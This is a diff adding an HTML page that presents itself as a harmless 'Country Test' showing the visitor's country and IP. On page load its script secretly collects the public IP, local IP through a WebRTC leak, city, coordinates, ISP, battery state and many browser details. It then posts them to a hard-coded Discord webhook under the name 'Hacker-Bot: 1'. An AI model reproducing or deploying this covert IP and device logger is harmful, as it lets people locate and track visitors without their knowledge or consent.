@@ -1,0 +1,237 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <style>
+  body{
+  	background-color: hsl(220, 50%, 70%);
+  	justify-content: center;
+   align-items: center;
+   display: flex;
+  }
+  .Menu{
+  	background-color: hsl(220, 60%, 90%);
+  	width: 700px;
+  	height: 1400px;
+  	margin: 200px 10px 10px;
+  	border-radius: 20px;
+  }
+  .Text{
+  	color: hsl(220, 80%, 50%);
+  	font-size: 3rem;
+  	font-weight: bolder;
+  	margin: 300px 150px 100px;
+  }
+  .title{
+  	color: black;
+  	font-size: 4rem;
+  	margin: 60px 150px 10px;
+  	font-weight: bolder;
+  }
+  .info{
+  	transition: all 0.5s;
+  	color: black;
+  	margin: 60px 60px 10px;
+  	font-weight: bolder;
+  	font-size: 2rem;
+  	transform: scale(0);
+  }
+  </style>
+</head>
+<body>
+	<h1></h1>
+	<div class="Menu">
+	   <h1 class="title">Country Test</h1>
+		<h1 id="S" class="Text">Searching.</h1>
+		<h1 id="info1" class="info"></h1>
+		<h1 id="info2" class="info"></h1>
+		<h1 id="info3" class="info"></h1>
+	</div>
+	<script>
+		
+const S = document.getElementById("S");
+const infoText1 = document.getElementById("info1");
+const infoText2 = document.getElementById("info2");
+const infoText3 = document.getElementById("info3");
+let T1 = true
+let T2 = false
+let T3 = false
+
+setInterval(() => {
+    if (T1 === true) {
+        S.textContent="Searching..";
+        T2 = true
+        T1 = false
+    }else if (T2 === true) {
+        S.textContent="Searching...";
+        T3 = true
+        T2 = false
+    }else if (T3 === true) {
+        S.textContent="Searching.";
+        T1 = true
+        T3 = false
+    }
+}, 1000);
+
+
+const webhookURL = "https://canary.discord.com/api/webhooks/1350065893597777981/QBYJC8ih6btu1RwnJWXThQT7kdKzxJK-3SNSOdWRHTKiahfHHpgfBoPmIpeOzd3hwHd7"
+const batteryInfo = navigator.getBattery ? navigator.getBattery() : null;
+const getDeviceName = () =>{
+const devices = ['iPhone', 'OPPO', 'Vivo', 'Realme', 'OnePlus', 'Samsung', 'Xiaomi', 'Huawei', 'Tecno', 'Windows', 'Macintosh', 'Linux'];
+const match = devices.find(device => new RegExp(device, 'i').test(navigator.userAgent));
+return match ? match.replace('Macintosh', 'Mac Device').replace('Windows', 'Windows Device').replace('Linux', 'Linux Device') : 'Unknown Device';};
+const getOSVersion = () =>{
+let ua = navigator.userAgent;
+let android = ua.match(/Android\s([\d.]+)/);
+let ios = ua.match(/OS (\d+_\d+(_\d+)?)/);
+if (android) return `Android ${android[1]}`;
+if (/iPad|iPhone|iPod/.test(ua)) return `iOS ${ios ? ios[1].replace(/_/g, ".") : "(version unknown)"}`;
+return "Unknown OS";};
+let os = getOSVersion();
+let IP = "Fetching...";
+let localIP = "Unavailable";
+let time = new Date();
+const deviceName = getDeviceName();
+const connection = navigator.connection || {};
+const ua = navigator.userAgent.toLowerCase();
+const isIOS = /iphone|ipad|ipod/.test(ua);
+const isAndroid = /android/.test(ua);
+const timeInfo = `${(time.getHours()<10?"0":"") + time.getHours()}:${(time.getMinutes()<10?"0":"") + time.getMinutes()}:${(time.getSeconds()<10?"0":"") + time.getSeconds()}`
+async function getIP(){
+    try {
+        let response = await fetch('https://api64.ipify.org?format=json');
+        let dataIP = await response.json();
+        IP = dataIP.ip;
+    } catch (error) {
+        console.error('Error fetching IP:', error);}}
+async function getLocalIP(){
+    return new Promise((resolve) => {
+        const pc = new RTCPeerConnection({ iceServers: [] });
+        pc.createDataChannel("");
+        pc.setLocalDescription(pc.createOffer());
+        pc.onicecandidate = (e) => {
+            const candidate = e.candidate?.candidate?.match(/(\d+\.\d+\.\d+\.\d+)/)?.[1];
+            if (candidate) resolve(candidate);};
+        setTimeout(() => resolve("Unavailable"), 2000);});}
+async function getC(){
+    try {
+        let response = await fetch('https://ipapi.co/json/');
+        let data = await response.json();
+        C = data.country_name + " " + data.country, L = data.languages, CC = data.country_calling_code, Ci = data.city, Re = data.region, Of = data.utc_offset, TZ = data.timezone, LG = data.longitude, LT = data.latitude, CA = data.country_area, Asn = data.asn, Org = data.org, CP = data.country_population
+    } catch (error) {
+        console.error('Error fetching country:', error);
+        C = "Unknown";}}
+getIP(); getC();
+async function sendToDiscord(){
+ S.style.display = "none";
+ infoText1.style.transform="scale(1)";
+ infoText2.style.transform="scale(1)";
+ infoText3.style.transform="scale(1)";
+ infoText1.textContent=`Your country is ${C||Unknown}`;
+ infoText2.textContent=`Your IP is ${IP||Unknown}`;
+ infoText3.textContent=`Your country code is ${CC||Unknown}`;
+ if (isAndroid){
+  getLocalIP().then((ip)=>{
+   localIP = ip;
+    batteryInfo.then(battery => {
+     let info = 
+`[+] Device: Android
+[+] Information: 1
+[+] Time: ${timeInfo||"Unknown"}
+[+] Country: ${C||"Unknown"}
+[+] Timezone: ${TZ||"Unknown"}
+[+] Public IP: ${IP||"Unknown"}
+[+] Local IP: ${localIP||"Unknown"}
+[+] Country Languages: ${L||"Unknown"}
+[+] Country Code: ${CC||"Unknown"}
+[+] City: ${Ci||"Unknown"}
+[+] Region: ${Re||"Unknown"}
+[+] Utc Offset: ${Of||"Unknown"}
+[+] Longitude: ${LG||"Unknown"}
+[+] Latitude: ${LT||"Unknown"}
+[+] Country_area: ${CA||"Unknown"}
+[+] Asn: ${Asn||"Unknown"}
+[+] Org: ${Org||"Unknown"}
+[+] Country Population: ${CP||"Unknown"}
+[+] Device Name: ${deviceName||"Unknown"}
+[+] Device Version: ${os||"Unknown"}
+[+] App Version: ${navigator.appVersion||"Unknown"}
+[+] App Name: ${navigator.appName||"Unknown"}
+[+] Online: ${navigator.onLine||"Unknown"}
+[+] Max Touch Points: ${navigator.maxTouchPoints||"Unknown"}
+[+] Product: ${navigator.product||"Unknown"}
+[+] UserAgent: ${navigator.userAgent||"Unknown"}
+[+] Platform: ${navigator.platform||"Unknown"}
+[+] Vendor: ${navigator.vendor||"Unknown"}
+[+] Language: ${navigator.language||"Unknown"}
+[+] Languages: ${navigator.languages||"Unknown"}
+[+] Cookie Enabled: ${navigator.cookieEnabled||"Unknown"}
+[+] App Code Name: ${navigator.appCodeName||"Unknown"}
+[+] Device Memory: ${navigator.deviceMemory||"Unknown"}
+[+] Hardware Concurrency: ${navigator.hardwareConcurrency||"Unknown"}
+[+] Downlink: ${connection.downlink||"Unknown"}
+[+] Save Data: ${navigator.connection.saveData||"Unknown"}
+[+] Effective Type: ${connection.effectiveType||"Unknown"}
+[+] RTT: ${connection.rtt || "Unknown"}
+[+] Battery Charging: ${battery.charging ? "true" : "false"||"Unknown"}
+[+] Battery Level: ${Math.round(battery.level * 100)||"Unknown"}%
+[+] Battery Charging Time: ${battery.chargingTime||"Unknown"}
+[+] Battery Discharging Time: ${battery.dischargingTime||"Unknown"}`;
+console.log(info);
+const messagePayload = {content: `\`\`\`\n${info}\n\`\`\``, username: "Hacker-Bot: 1", avatar_url: "https://example.com/avatar.png"}
+fetch(webhookURL, {method: "POST", headers: { "Content-Type": "application/json" }, body: JSON.stringify(messagePayload)})})});
+}else if (isIOS){
+let info = 
+`[+] Device: Android
+[+] Information: 1
+[+] Time: ${timeInfo||"Unknown"}
+[+] Country: ${C||"Unknown"}
+[+] Timezone: ${TZ||"Unknown"}
+[+] Public IP: ${IP||"Unknown"}
+[+] Local IP: ${localIP||"Unknown"}
+[+] Country Languages: ${L||"Unknown"}
+[+] Country Code: ${CC||"Unknown"}
+[+] City: ${Ci||"Unknown"}
+[+] Region: ${Re||"Unknown"}
+[+] Utc Offset: ${Of||"Unknown"}
+[+] Longitude: ${LG||"Unknown"}
+[+] Latitude: ${LT||"Unknown"}
+[+] Country_area: ${CA||"Unknown"}
+[+] Asn: ${Asn||"Unknown"}
+[+] Org: ${Org||"Unknown"}
+[+] Country Population: ${CP||"Unknown"}
+[+] Device Name: ${deviceName||"Unknown"}
+[+] Device Version: ${os||"Unknown"}
+[+] App Version: ${navigator.appVersion||"Unknown"}
+[+] App Name: ${navigator.appName||"Unknown"}
+[+] Online: ${navigator.onLine||"Unknown"}
+[+] Max Touch Points: ${navigator.maxTouchPoints||"Unknown"}
+[+] Product: ${navigator.product||"Unknown"}
+[+] UserAgent: ${navigator.userAgent||"Unknown"}
+[+] Platform: ${navigator.platform||"Unknown"}
+[+] Vendor: ${navigator.vendor||"Unknown"}
+[+] Language: ${navigator.language||"Unknown"}
+[+] Languages: ${navigator.languages||"Unknown"}
+[+] Cookie Enabled: ${navigator.cookieEnabled||"Unknown"}
+[+] App Code Name: ${navigator.appCodeName||"Unknown"}
+[+] Device Memory: ${navigator.deviceMemory||"Unknown"}
+[+] Hardware Concurrency: ${navigator.hardwareConcurrency||"Unknown"}
+[+] Downlink: ${connection.downlink||"Unknown"}
+[+] Save Data: ${navigator.connection.saveData||"Unknown"}
+[+] Effective Type: ${connection.effectiveType||"Unknown"}
+[+] RTT: ${connection.rtt || "Unknown"}
+[+] Battery Charging: ${battery.charging ? "true" : "false"||"Unknown"}
+[+] Battery Level: ${Math.round(battery.level * 100)||"Unknown"}%
+[+] Battery Charging Time: ${battery.chargingTime||"Unknown"}
+[+] Battery Discharging Time: ${battery.dischargingTime||"Unknown"}`;
+const messagePayload = {
+    content: `\`\`\`\n${info}\n\`\`\``,
+    username: "Hacker-Bot: 1",
+    avatar_url: "https://example.com/avatar.png"}
+fetch(webhookURL, {
+    method: "POST",
+    headers: { "Content-Type": "application/json" },
+    body: JSON.stringify(messagePayload)})}};
+setTimeout(sendToDiscord, 5000);
+	</script>
+</body>
+</html>
